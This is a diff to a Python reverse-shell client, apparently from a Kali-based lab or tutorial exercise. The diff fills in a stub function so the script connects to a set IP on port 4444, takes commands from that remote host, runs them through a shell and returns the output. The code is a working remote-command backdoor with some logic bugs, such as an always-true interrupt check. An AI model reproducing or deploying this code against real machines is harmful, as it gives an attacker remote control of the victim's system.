@@ -4,6 +4,7 @@ import subprocess
 import os
 import base64
 import time
+import subprocess
 
 def server_connect(ip, port):
     global connection
@@ -27,11 +28,17 @@ def receive():
             return json.loads(json_data)
         except ValueError:
             continue
-"""
+
 def client_run():
-    Implement this function.
-"""
+    while True:
+        cmd = receive()
+        if cmd:
+            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
+            send(result)
+        if KeyboardInterrupt:
+            connection.close()
+            break
 
-server_connect('10.0.2.15', 4444) #Replace 10.0.2.15 with your Kali IP
+server_connect('192.168.64.2', 4444) #Replace 10.0.2.15 with your Kali IP
 
-#client_run()
+client_run()
